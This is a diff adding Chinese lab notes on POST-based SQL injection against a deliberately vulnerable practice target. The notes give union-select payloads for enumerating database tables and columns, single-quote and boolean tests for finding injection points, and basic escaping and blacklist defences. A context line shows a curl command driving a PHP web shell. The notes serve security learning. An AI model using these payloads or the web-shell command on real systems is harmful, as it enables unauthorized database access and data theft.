@@ -1270,6 +1270,180 @@ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
 
 ### POST注入 
 
+#### POST型SQL注入漏洞是什么？
+
+- 在HTTP常用方法中，POST方法提交的信息不存储与URL，而是存储在HTTP实体内容中，在大多的提交过程，用户是无感知的。
+- 且注入信息是存储于HTTP实体内容中而不是URL，通过改造实体内容，达到实际执行的SQL语句获取更多信息的目的。 
+
+
+
+#### POST注入实战
+
+- 安装，注册，并登录靶机
+
+- 选择bug类型：Choose your bug: SQL Injection (POST/Select)
+
+- 查看POST请求 
+
+  - 使用 Burp Suite 进行请求的抓取
+  - 查看到请求body的内容：movie=4&action=go
+
+- Send to Repeater 
+
+  - 右键，发送到repeater 进行重放攻击 
+  - 进入 Repeater ，重新 Send 尝试不同body
+
+- 构造输入，测试SQL注入点 
+
+  - 当使用 movie=1’&action=go  的时候，会报错
+
+- 使用 union 构造语句获取信息，尝试获取union参数个数 
+
+  - body 的内容为：movie=4 union select 1,2 #&action=go 时候，可以看到内容
+  - 继续添加显示的字段数量
+  - body 的内容为：movie=4 union select 1,2,3,4,5,6,7 #&action=go 时候，成功显示数据
+  - 但是看不到 可以展示的字段是哪个
+  - body 的内容为：movie=11 union select 1,2,3,4,5,6,7 #&action=go时候，查询一个不存在的数据就可以展示出来数字对应的字段了
+
+- 使用INFORMATION_SCHEMA.tables， 获取数据库详细信息 
+
+  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() # &action=go
+
+  - 由于 table 只展示一条数据，无法展示出具体有多少个表
+
+  - 服务端实现
+
+    ![1617101098966](HackerMeWeb.assets/1617101098966.png)
+
+- 通过猜测，进行数据表的模糊匹配
+
+  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() and table_name like 'user%' # &action=go
+  - 可以看到有一个 users 的数据表
+
+- 进行users表结构信息获取 
+
+  - body 的内容为：movie=11 union select 1,column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name='users' # &action=go
+  - 只可以看到有一个字段是 id
+
+- 进行 用户数据获取
+
+  - 使用 password 进行模糊匹配？
+
+
+
+
+
+#### 判断SQL注入点 
+
+- 判断注入点时的关键点
+
+  - 判断该访问目标 URL 是否存在 SQL 注入？
+  - 如果存在 SQL 注入，那么属于哪种 SQL 注入？
+  - TIPS：只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在 SQL 注入。 
+
+- 判断SQL注入点 – 经典的单引号判断法 
+
+  - http://xxx/test.php?id=1'
+  - 如果页面返回错误，则存在 SQL 注入。
+  - 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 
+
+- 判断SQL注入点 – 判断注入类型 
+
+  - 通常SQL注入分为两种：数字型 + 字符型
+  - 数字型：
+    - 通常语句类型为 select * from <表名> where id = x
+    - 我们通常构造and 1=1以及and 1=2来判断
+    - select * from test where id=1 and 1=1;
+  - 字符型：
+    - 通常语句类型为select * from <表名> where id = 'x'
+    - 我们通常构造and '1'='1以及and '1'='2来判断 
+    - select * from test where name='test1' and '1'='1';
+
+- 判断SQL注入点 – 回归测试 
+
+  - 打开靶机，设置为 SQL Injection (GET/Search)
+  - 使用 http://xforburp.com/sqli_1.php?title=d%' and '1'='1'-- &action=search 测试
+  - 不添加那个 % ，就无法获得数据
+  - 来看一遍源码 ，cd /var/www/html， vim sqli_1.php
+
+  ![1617098333173](HackerMeWeb.assets/1617098333173.png)
+
+  - 可以看到SQL语句的写法是很多的，前面提到的SQL注入判断方式也不是万能药，要根据不同情况灵活调整。
+  - 核心是什么？
+  - 推测后端SQL语句的形态，尝试闭合SQL语句。 
+
+
+
+#### “初级“注入防御方法 
+
+- 减少错误信息反馈 
+
+- 对输入特殊符号进行转义（黑名单） 
+
+  - \$id=mysql_escape_string($id) 
+  - 将对id中以下特殊进行转义：
+  - \x00 \n \r \  ‘  “  \x1a
+  - 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 
+  - PHP API 进行转义，mysql_escape_string
+
+  ![1617106154979](HackerMeWeb.assets/1617106154979.png)
+
+- 对输入特殊词组进行过滤（黑名单） 
+
+  - 常见的关键字：and、or、union 、select、空格等等过滤 
+
+
+
+### 时间盲注 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
